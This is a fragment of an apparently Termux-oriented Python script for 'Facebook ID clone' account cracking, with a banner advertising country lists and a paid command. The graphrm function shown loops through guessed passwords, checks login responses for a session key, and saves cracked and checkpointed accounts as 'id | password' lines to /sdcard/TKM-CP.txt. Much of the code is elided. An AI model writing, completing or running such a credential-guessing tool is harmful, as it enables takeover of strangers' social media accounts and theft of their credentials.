...
=====================================
          𝙄𝙉𝘿𝙄𝘼 𝙋𝘼𝙆𝙄𝙎𝙏𝘼𝙉 𝘽𝘼𝙉𝙂𝙇𝘼𝘿𝙀𝙎𝙃
         𝘼𝙁𝙂𝙃𝘼𝙉𝙄𝙎𝙏𝘼𝙉 𝙉𝘼𝙋𝘼𝙇 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼
        𝙋𝙃𝙄𝙇𝙄𝙇𝙋𝙋𝙄𝙉𝙀𝙎 𝙉𝙄𝙂𝙀𝙍𝙄𝘼 𝙆𝘼𝙎 𝙐𝙎𝘼
       𝙋𝘼𝙄𝘿 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝘿𝘼𝙏𝘼 + 𝙒𝙄𝙁𝙄 𝙒𝙊𝙍𝙆𝙄𝙉𝙂
       𝙑𝙏 𝟯𝟮+𝟲𝟰 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 𝟭𝟬𝟬% 𝘽𝘼𝙎𝙏 𝘾𝙊𝙈𝙈𝘼𝙉𝘿
       𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙊𝙇𝘿 𝙄𝘿 𝘾𝙇𝙊𝙉𝙀 𝙐𝙋𝘿𝘼𝙏𝙀 
       𝘼𝘿𝙈𝙄𝙉 + 𝙊𝙒𝙉𝙀𝙍 𝙀𝙃𝘾 𝙀𝙈𝙍𝘼𝙉 ✣
       𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙇 𝙄𝘿 𝘾𝙇𝙊𝙉𝙀 𝙇𝙊𝙂𝙄𝙉𝙂 𝟭𝟬𝟬%
       𝟭𝟰/𝟭𝟱/𝟭𝟲/𝟭𝟳/𝟭𝟴/𝟭𝟵 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿 𝘾𝙇𝙊𝙉𝙀
       𝟮𝟬𝟮𝟱 𝙉𝙀𝙒 𝙐𝙋𝘿𝘼𝙏𝙀 𝟮𝟬𝟮𝟱 𝟮7/𝘿𝘾𝙀 𝙁𝙍𝙄𝘿𝘼𝙔
=====================================\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}𝟮7/𝘿𝘾𝙀{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[𝟮7/𝘿𝘾𝙀] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
